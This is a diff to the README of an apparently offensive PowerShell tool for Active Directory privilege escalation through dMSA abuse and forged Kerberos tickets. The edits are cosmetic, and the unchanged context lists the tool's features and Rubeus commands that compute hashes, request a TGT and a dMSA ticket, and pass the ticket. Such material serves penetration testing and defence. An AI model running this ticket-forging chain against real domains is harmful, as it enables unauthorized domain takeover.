@@ -27,7 +27,7 @@ This technique abuses dMSA behavior to escalate privileges by forging Kerberos t
 - Quiet mode (`-Quiet`) suppresses post-exploitation instructions.
 - Smart identity resolution for the `-PrecededByIdentity` option (accepts users, computers, or other AD objects).
 - Handles common edge cases such as existing accounts, incorrect distinguished names, and missing RID 500 (default admin).
-- Purely uses the ActiveDirectory PowerShell module—no external binaries required.
+- Purely uses the ActiveDirectory PowerShell module — no external binaries required.
 
 ---
 
@@ -115,9 +115,9 @@ The script automatically resolves this identity in Users, Computers, or domain o
 ## Post-Exploitation with Rubeus
 Example commands generated for ticket forging:
 ```
-Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:eighteen.htb
-Rubeus.exe asktgt /user:Pwn$ /aes256:<AES256KEY> /domain:eighteen.htb
-Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>
+Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:<domain>
+Rubeus.exe asktgt /user:Pwn$ /aes256:<AES256KEY> /domain:<domain>
+Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/<domain> /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>
 ```
 
 Fill placeholders like `<AES256KEY>` and `<BASE64TGT>` with actual values from previous steps.
@@ -158,7 +158,7 @@ For educational and authorized testing only. Use only with explicit permission. 
 
 ## Author
 
-- **B5null**
+- :skull: **B5null**
 
 
 
